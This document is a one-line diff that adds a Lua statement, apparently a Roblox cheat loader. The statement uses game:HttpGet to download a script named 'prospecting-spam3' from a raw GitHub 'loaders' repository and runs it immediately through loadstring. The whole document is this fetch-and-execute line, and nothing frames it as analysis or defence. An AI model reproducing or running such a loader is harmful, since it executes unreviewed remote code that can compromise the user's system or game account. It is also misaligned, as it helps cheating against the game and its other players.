@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/prospecting-spam3-3izmpjr2ik6vdh.lua"))()
